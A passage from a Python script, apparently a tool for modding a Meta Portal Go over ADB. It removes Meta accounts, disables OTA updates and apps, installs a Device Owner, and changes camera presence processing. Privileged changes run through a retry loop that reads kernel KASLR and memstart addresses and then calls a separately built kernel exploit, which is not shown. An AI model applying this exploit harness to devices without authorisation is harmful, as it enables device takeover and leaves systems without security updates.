            f"pid={pid!r} camera_active={int(camera_active)} "
            f"camera_allowed={int(camera_allowed)} "
            f"analysis_frames={int(analysis_frames)} "
            f"roi_frames={int(roi_frames)} "
            f"pose_metrics={int(pose_metrics)} "
            f"frame_processor_loaded={int(frame_processor_loaded)} "
            f"presence_event={int(presence_event)} "
            f"profile_keys={','.join(sorted(loaded_keys)) or 'none'}"
        )

    def verify_meta_accounts_removed(self) -> None:
        accounts = self.meta_accounts()
        if accounts:
            raise ProvisionError(
                "Meta accounts remain: "
                + ", ".join(f"{account_type}/{name}" for name, account_type in accounts)
            )
        disabled = self.disabled_meta_authenticators()
        missing = set(META_AUTHENTICATOR_COMPONENTS) - disabled
        if missing:
            raise ProvisionError(
                "Meta authenticators became enabled: " + ", ".join(sorted(missing))
            )
        package_state = self.adb_run(
            ["shell", "pm", "list", "packages", "-d"], timeout=15, check=True
        ).stdout
        if "package:com.facebook.alohaservices.alohausers" in package_state:
            raise ProvisionError("alohausers package was disabled instead of its authenticators")
        self.verify_retained_platform()
        print(
            "META_ACCOUNTS_REMOVED_OK accounts=0 authenticators=disabled "
            "alohausers=enabled"
        )

    def verify_requested_state(self) -> None:
        if self.audio:
            self.verify_watchdog()
        if self.device_owner:
            self.verify_device_owner()
        if self.disable_updates:
            self.disable_ota_packages()
            self.verify_ota_block()
        if self.debloat:
            self.verify_debloat()
        if self.restore_bloat:
            self.verify_debloat_restored()
        if self.remove_meta_accounts:
            self.verify_meta_accounts_removed()
        if self.optimize_presence:
            self.verify_presence_runtime(require_profile=True)
        if self.restore_presence_profile:
            self.verify_presence_runtime(require_profile=False)

    def verify_across_two_reboots(self, first_boot: str | None = None) -> None:
        if first_boot is None:
            _, first_boot = self.reboot()
        self.verify_requested_state()
        print("VERIFY_REBOOT starting", flush=True)
        before, second_boot = self.reboot()
        if before != first_boot:
            raise ProvisionError(
                f"unexpected boot changed before verification: {first_boot} -> {before}"
            )
        self.verify_requested_state()
        print(
            f"PROVISION_OK first_boot={first_boot} second_boot={second_boot} "
            f"logs={self.log_dir}"
        )

    def provision(self) -> None:
        self.connect(wait_seconds=30)
        self.verify_target()
        already_owner = self.device_owner_preflight() if self.device_owner else False
        already_meta_clean = (
            self.meta_accounts_preflight() if self.remove_meta_accounts else False
        )
        if self.debloat:
            self.apply_debloat()
        if self.restore_bloat:
            self.restore_debloat()
        if self.disable_updates:
            self.disable_ota_packages()

        privileged_action = (
            self.audio
            or self.disable_updates
            or self.optimize_presence
            or self.restore_presence_profile
            or (self.device_owner and not already_owner)
            or (self.remove_meta_accounts and not already_meta_clean)
        )
        if not privileged_action:
            self.verify_across_two_reboots()
            return

        if not self.skip_build:
            build(
                build_audio=self.audio,
                build_account=self.remove_meta_accounts,
            )
        self.stage()
        clean_boot_id: str | None = None
        for attempt in range(1, self.attempts + 1):
            if clean_boot_id is None:
                print(f"INSTALL_ATTEMPT={attempt} preparing clean boot", flush=True)
                _, boot_id = self.reboot()
            else:
                boot_id = clean_boot_id
                clean_boot_id = None
                print(
                    f"INSTALL_ATTEMPT={attempt} using post-attempt clean boot "
                    f"boot_id={boot_id}",
                    flush=True,
                )
            try:
                base = self.kaslr_base(str(attempt))
                memstart = self.memstart(str(attempt))
            except ProvisionError as exc:
                print(f"ADDRESS_DISCOVERY_RETRY attempt={attempt} error={exc}")
                continue
            print(
                f"RUNTIME_ADDRESSES attempt={attempt} boot_id={boot_id} "
                f"kaslr={base:#x} memstart={memstart:#x}",
                flush=True,
            )
            exploit_ok = self.exploit(base, memstart, attempt)
            post_attempt_boot = self.connect_after_reboot(boot_id)
            if not exploit_ok:
                clean_boot_id = post_attempt_boot
                continue
            self.verify_across_two_reboots(first_boot=post_attempt_boot)
            return
        raise ProvisionError(f"provisioning failed after {self.attempts} attempts")


def build(build_audio: bool, build_account: bool) -> None:
    commands = [["make", "-C", str(ROOT / "exploit"), "-j2", "all"]]
    if build_audio:
        commands.append(["make", "-C", str(ROOT / "helper"), "native"])
    if build_account:
        commands.append(["make", "-C", str(ROOT / "exploit"), "account-ctl"])
    for command in commands:
        result = subprocess.run(command, cwd=ROOT, check=False)
        if result.returncode != 0:
            raise ProvisionError(f"build failed: {shlex.join(command)}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Provision selected Portal Go audio, Device Owner, OTA, debloat, "
            "Meta-account, and presence-processing controls, then verify them "
            "across two reboots."
        )
    )
    parser.add_argument("--serial", default="192.168.1.72:5555")
    parser.add_argument("--attempts", type=int, default=12)
    parser.add_argument(
        "--audio",
        action="store_true",
        help=(
            "install the persistent hardware AEC/NS watchdog; this remains "
            "the default action when no provisioning action is specified"
        ),
    )
    parser.add_argument(
        "--device-owner",
        action="store_true",
        help=(
            "install Kiosk Satellite as Device Owner and verify it "
            "across both reboots"
        ),
    )
    parser.add_argument(
        "--skip-build", action="store_true", help="use existing build outputs"
    )
    parser.add_argument(
        "--disable-updates",
        action="store_true",
        help=(
            "disable Meta's OTA UI/test packages and install a persistent "
            "MobileConfig override for the native OTA daemon"
        ),
    )
    debloat_group = parser.add_mutually_exclusive_group()
    debloat_group.add_argument(
        "--debloat",
        action="store_true",
        help=(
            "persistently disable the conservative Meta app/telemetry "
            "profile and save each package's original state"
        ),
    )
    debloat_group.add_argument(
        "--restore-bloat",
        action="store_true",
        help="restore package states saved by the first --debloat run",
    )
    parser.add_argument(
        "--remove-meta-accounts",
        action="store_true",
        help=(
            "remove the four Portal Meta accounts locally and persistently "
            "disable only their authenticator service components"
        ),
    )
    presence_group = parser.add_mutually_exclusive_group()
    presence_group.add_argument(
        "--optimize-presence",
        action="store_true",
        help=(
            "disable Smart Camera background segmentation, liveness scoring, "
            "and re-identification while requiring AIService's analysis and "
            "pose pipeline to remain live"
        ),
    )
    presence_group.add_argument(
        "--restore-presence-profile",
        action="store_true",
        help=(
            "restore the AIService settings file saved by the first "
            "--optimize-presence run"
        ),
    )
    parser.add_argument(
        "--log-dir",
        type=pathlib.Path,
        help="directory for exploit attempt logs (default: a timestamp under /tmp)",
    )
    args = parser.parse_args()
    if not 1 <= args.attempts <= 100:
        parser.error("--attempts must be between 1 and 100")
    if not any(
        (
            args.audio,
            args.device_owner,
            args.disable_updates,
            args.debloat,
            args.restore_bloat,
            args.remove_meta_accounts,
            args.optimize_presence,
            args.restore_presence_profile,
        )
    ):
        args.audio = True
    return args


def main() -> int:
    args = parse_args()
    stamp = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    log_dir = args.log_dir or pathlib.Path(f"/tmp/portal-provision-{stamp}")
    log_dir.mkdir(parents=True, exist_ok=True)
    try:
        PortalProvisioner(
            args.serial,
            args.attempts,
            log_dir,
            audio=args.audio,
            device_owner=args.device_owner,
            disable_updates=args.disable_updates,
            debloat=args.debloat,
            restore_bloat=args.restore_bloat,
            remove_meta_accounts=args.remove_meta_accounts,
            optimize_presence=args.optimize_presence,
            restore_presence_profile=args.restore_presence_profile,
            skip_build=args.skip_build,
        ).provision()
    except (ProvisionError, OSError, zipfile.BadZipFile) as exc:
        print(f"PROVISION_ERROR: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
